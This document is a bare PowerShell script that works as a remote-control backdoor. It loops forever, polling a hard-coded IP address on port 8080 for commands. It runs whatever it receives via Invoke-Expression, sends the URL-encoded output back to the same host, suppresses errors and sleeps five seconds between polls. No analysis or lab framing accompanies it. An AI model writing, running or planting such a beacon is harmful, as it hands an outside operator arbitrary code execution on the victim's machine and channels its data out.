while ($true) {
    try {
        $cmd = Invoke-RestMethod -Uri "http://103.153.73.37:8080/get"
        if ($cmd -ne "") {
            $out = Invoke-Expression $cmd | Out-String
            $url = "http://103.153.73.37:8080/result?r=" + [System.Web.HttpUtility]::UrlEncode($out)
            Invoke-RestMethod -Uri $url
        }
    } catch {}
    Start-Sleep -Seconds 5
}
